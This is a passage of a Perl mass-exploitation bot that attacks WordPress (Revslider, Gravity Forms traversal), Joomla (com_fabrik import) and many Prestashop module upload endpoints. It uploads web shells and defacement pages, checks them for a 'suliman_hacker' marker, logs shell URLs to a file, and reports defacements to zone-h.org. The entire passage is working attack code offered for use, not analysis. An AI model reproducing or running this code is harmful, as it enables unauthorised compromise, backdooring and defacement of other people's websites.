    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed beach_apollo\n"; }
my $cuckootap = $ua->get("$site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($cuckootap =~/suliman_hacker/) {

    print "[+] cuckootap successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed cuckootap\n"; }
my $pindol = $ua->get("$site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/cloud.php")->content;
if($pindol =~/suliman_hacker/) {

    print "[+] pindol successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/pindol/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed pindol\n"; }
my $designplus = $ua->get("$site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($designplus =~/suliman_hacker/) {

    print "[+] designplus successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed designplus\n"; }
my $rarebird = $ua->get("$site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($rarebird =~/suliman_hacker/) {

    print "[+] rarebird successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed rarebird\n"; }
my $andre = $ua->get("$site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/cloud.php")->content;
if($andre =~/suliman_hacker/) {

    print "[+] andre successfully uploaded\n";
    open(save, '>>BotV2/Shell3z.txt');
    print save "[Revslider] : $site/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/cloud.php\n";
    close(save); 
}
else { print "[-] Failed andre\n"; }
} else {
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');
}
}
######################
######################
######################
######################
######################
######################

sub comfabr(){
print"Trying Com Fabrik Shell ...   ";
$comfab= $site . '/index.php?option=com_fabrik&c=import&view=import&filetype=csv&table=1';
$def = $site . '/media/spy.txt';
$fabshell = $site . '/media/SS.PhP.txt';
##
$indfile="tools/spy.txt";
$shelfile="tools/SS.PhP.txt";
##
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$shelfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$fabshell")->content;
if($checkfab =~/suliman_hacker/) {
    print color('bold green');
print  "Sucess .... :D  \n";
    print color('reset');
	print "[SHELL LINK] => $fabshell\n";
        open (TEXT, '>>BotV2/Shell3z.txt');
        print TEXT "[COM FABRIC] =>$fabshell \n";
        close (TEXT);
}else{
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');

    }
}

sub indecomfabr(){
print"Trying Com Fabrik Index ...";
    my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
    $ua->timeout(10);
    $ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
    my $indfab = $ua->post("$comfab", Cookie => "", Content_Type => "form-data", Content => ["userfile" => ["$indfile"], "name" => "me.php", "drop_data" => "1", "overwrite" => "1", "field_delimiter" => ",", "text_delimiter" => "&quot;", "option" => "com_fabrik", "controller" => "import", "view" => "import", "task" => "doimport", "Itemid" => "0", "tableid" => "0"]);
my $checkfab = $ua->get("$def")->content;
if($checkfab =~/suliman_hacker/) {

    print color('bold green');
print  "Sucess .... :D  \n";
    print color('reset');
    print "[INDEX LINK] => $def\n";
zoneh();
            }else{
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');

                        }
}
######################
######################
######################
#####  Gravity  ######
######################
######################
######################
sub gravity(){
print"Trying Gravity SHELL ...   ";


my $path = "/?gf_page=upload";

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["11.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../", name => "css.php.jd"]);
if ($exploit->decoded_content =~ /_input_3_css.php.jd/) {
    print "[+] Payload successfully executed\n";
    print "[+] Lib Uploaded\n";
   


my $check = $ua->get("$target/wp-content/uploads/_input_3_css.php.jd")->content;
my $checkk = $ua->get("$target/wp-includes/wp-footer.php")->content;
if($checkk =~/suliman_hacker/) {
print "  [+] Shell Uploaded\n";

    open(save, '>>BotV2/Shell3z.txt');
	
    print save "$target/wp-includes/wp-footer.php\n";
	
    close(save);

    my $checkkk = $ua->get("$target/def.html")->content;
    if($checkkk =~m/Hacked/i) {
  
    print color('bold green');
print  "Sucess .... :D  \n";
    print color('reset');		
        
	$Dom="$target/def.html";
				$Def="Sniper Jo";
				if ($Dom =~ /http:\/\//)
				{
				$U="http://zone-h.org/notify/single";
				$lwp=LWP::UserAgent->new;
                #$lwp->proxy(['http'] => 'http://183.207.228.51:83');
				$res=$lwp  -> post($U,[
				'defacer'     => $Def,
				'domain1'   => $Dom,
				'hackmode' => '15',
				'reason'       => '1',
				'submit'       => 'Send',
				]);
				if ($res->content =~ /color="red">(.*)<\/font><\/li>/) {
				print " [Zone] $target submit $1\n";
				open(save, '>>BotV2/index.txt');
        print save "$target/def.html\n";
        close(save);
				}
				else
				{
				print " [Zone] $target Error\n";
					open(save, '>>BotV2/index.txt');
        print save "$target/def.html\n";
        close(save);
				}
	}
	} 
}
	else 
	{ 
	
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');	
	}
	
}
else {
      print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');	
}

}
sub upindex{
my $path = "/?gf_page=upload";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "spy.html"]);
print "Trying To Upload Index gravity ...";
if ($indexploit->decoded_content =~ /_input_3_spy.html/) {
    $def= $site . '/_input_3_spy.html';
	    print color('bold green');
    print "succes Defaced \n $def \n";
    print color('reset');

    open(save, '>>BotV2/Shell3z.txt');
    print save "[Gravity] : $def\n";
    close(save);
        zoneh();
       }else{
    print color('bold red');
print  "Failed .... :(  \n";
    print color('reset');
       }
   }
######################
######################
######################
#####  Presta   ######
######################
######################
######################
sub presta(){
$def=$site ."readme.html";

print"Trying Prestashop SHELL ...   ";

print "[1] Exploiting .... [Wait]\n";
$explone="$site/modules/columnadverts/uploadimage.php";
fuckone();
print "[2] Exploiting .... [Wait]\n";
$exptow="$site/modules/simpleslideshow/uploadimage.php";
fucktow();
print "[3] Exploiting .... [Wait]\n";
$expthre="$site/modules/productpageadverts/uploadimage.php";
fuckthre();
print "[4] Exploiting .... [Wait]\n";
$expfor="$site/modules/homepageadvertise/uploadimage.php";
fuckfor();
print "[5] Exploiting .... [Wait]\n";
$expfif="$site/modules/soopamobile/uploadimage.php";
fuckfif();
print "[6] Exploiting .... [Wait]\n";
$expsix="$site/modules/homepageadvertise2/uploadimage.php";
fucksix();
print "[7] Exploiting .... [Wait]\n";
$expsev="$site/modules/jro_homepageadvertise/uploadimage.php";
fucksev();
print "[8] Exploiting .... [Wait]\n";
$expeyt="$site/modules/attributewizardpro/file_upload.php";
sirina();
print "[9] Exploiting .... [Wait]\n";
$expnan="$site/modules/attributewizardpro.OLD/file_upload.php";
sirinaa();
################### PNG ###############
print "[10] Exploiting .... [Wait]\n";
$expng="$site/modules/advancedslider/ajax_advancedsliderUpload.php?action=submitUploadImage%26id_slide=php";
uppng();
####
print "[11] Exploiting .... [Wait]\n";
$expngg="$site/modules/cartabandonmentpro/upload.php";
uppngg();
###
print "[12] Exploiting .... [Wait]\n";
$expmp="$site/modules/videostab/ajax_videostab.php?action=submitUploadVideo%26id_product=upload";
upmp();

}
####################################################################################
sub uppng(){
$png ="presta.php.png";
my $res = $ua->post($expng, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php.png', name=>'qqfile', content => [ qqfile => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scanning]\n";
$upl ="$site/modules/advancedslider/uploads/presta.php.png?spyx";
$shell ="$site/modules/attributewizardpro/file_uploads/spybot.php";
shekk();
}

####################################################################################
sub uppngg(){
$png ="presta.php.png";
my $res = $ua->post($expngg, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php.png', name=>'image', content => [ image => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scanning]\n";
$upl ="$site/modules/cartabandonmentpro/uploads/presta.php.png?spyx";
$shell ="$site/modules/cartabandonmentpro/uploads/spybot.php ";
shekk();

}
#####################################################################################
sub upmp(){
$png ="presta.php.mp4";
my $res = $ua->post($expmp, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php.png', name=>'qqfile', content => [ qqfile => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scanning]\n";
$upl ="$site/modules/videostab/uploads/presta.php.png?spyx";
$shell ="$site/modules/videostab/uploads/spybot.php ";
shekk();

}

##############################################
##############################################
##############################################
sub sirina(){
$png ="presta.php.png";
my $res = $ua->post($expeyt, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php.png', name=>'userfile', content => [ userfile => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scanning]\n";
$upl ="$site/modules/attributewizardpro/file_uploads/presta.php.png?spyx";
$shell ="$site/modules/attributewizardpro/file_uploads/spybot.php ";
shekk();
}
####################
sub sirinaa(){
$png ="presta.php.png";
my $res = $ua->post($expnan, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php.png', name=>'userfile', content => [ userfile => [$png]]);
$gass= $res->decoded_content;
print "$site ............... [Scaning]\n";
$upl ="$site/modules/attributewizardpro.OLD/file_uploads/presta.php?spyx";
$shell ="$site/modules/attributewizardpro.OLD/file_uploads/spybot.php ";
shekk();
}
##############################################
##############################################
##############################################

sub fuckfif(){
$shlez = "presta.php";
my $res = $ua->post($expfif, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/soopamobile/slides/presta.php?spyx";
$shell ="$site/modules/soopamobile/slides/spybot.php ";
shekk();
}else{
print "$site ............... [Error]\n";
}
}
###############################################
sub fucksix(){
$shlez = "presta.php";
my $res = $ua->post($expsix, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/homepageadvertise2/slides/presta.php?spyx";
$shell ="$site/modules/homepageadvertise2/slides/spybot.php ";
shekk();
}else{
print "$site ............... [Error]\n";
}
}
################################
sub fucksev(){
$shlez = "presta.php";
my $res = $ua->post($expsev, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/jro_homepageadvertise/slides/presta.php?spyx";
$shell ="$site/modules/jro_homepageadvertise/slides/spybot.php ";
shekk();
}else{
print "$site ............... [Error]\n";
}
}
################################

###################### 

sub fuckone(){
$shlez = "presta.php";
my $res = $ua->post($explone, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/columnadverts/slides/presta.php?spyx";
$shell ="$site/modules/columnadverts/slides/spybot.php ";
shekk();
}else{
print "$site ............... [Error]\n";
}
}




########
sub fucktow(){
$shlez = "presta.php";
my $res = $ua->post($exptow, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/simpleslideshow/slides/presta.php?spyx";
$shell="$site/modules/simpleslideshow/slides/spybot.php ";
shekk();
}else{
print "$site ............... [Error]\n";
}
}
########
sub fuckthre(){
$shlez = "presta.php";
my $res = $ua->post($expthre, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/productpageadverts/slides/presta.php?spyx";
$shell="$site/modules/productpageadverts/slides/spybot.php ";
shekk();
}else{
print "$site ............... [Error]\n";
}
}
###########
sub fuckfor(){
$shlez = "presta.php";
my $res = $ua->post($expfor, Content_Type => 'multipart/form-data', Content-Disposition=> 'form-data',filename=>'presta.php', name=>'userfile', content => [ userfile => [$shlez]]);
$gass= $res->decoded_content;

if ($gass =~ m/success/i){
$upl ="$site/modules/homepageadvertise/slides/presta.php?spyx";
$shell="$site/modules/homepageadvertise/slides/spybot.php \n";
shekk();
}else{
print "$site ............... [Error]\n";
}
}

sub shekk(){
my $shcheck = $ua->get("$shell")->content;
if($shcheck =~/suliman_hacker/) {
   

print "...Sucess\n";
print "[PrestaShop] | $shell \n";
    open(save, '>>BotV2/Shell3z.txt');   
    print save "[PrestaShop] | $shell\n";   
    close(save);

my $shcheckin = $ua->get("$def")->content;
if($shcheckin =~/suliman_hacker/) {
print "[Defaced]..........[TO Zone]\n";
zoneh();

}else{
print "[Shell ]..........[Error]\n";
}

}else{print "[EXPLOIT ERROR]";}
}

######################
######################
######################
#####  Zone-H   ######
######################
######################
######################
sub zoneh(){
print"Trying To Post In Zone-h ...   ";

    open(save, '>>Result/index.txt');
    print save "$def\n";
    close(save);

                                $hack="suliman_hacker";
                                $zn="http://zone-h.org/notify/single";
                                $lwp=LWP::UserAgent->new;
                                $res=$lwp  -> post($zn,[
                                'defacer'     => $hack,
                                'domain1'   => $def,
                                'hackmode' => '15',
                                'reason'       => '1',
                                'submit'       => 'Send',
                                ]);
                                if ($res->content =~ /color="red">ERROR<\/font><\/li>/) {
   print color('bold red');
print "Failed ... :(\n";
    print color('reset');

                                }
                                elsif ($res->content =~ /color="red">OK<\/font><\/li>/) {
   print color('bold green');
print "Success ... :D\n";
    print color('reset');



                                }
                                else
                                {
 print"there is a probem ... :(\n";
                                }
                            }
							
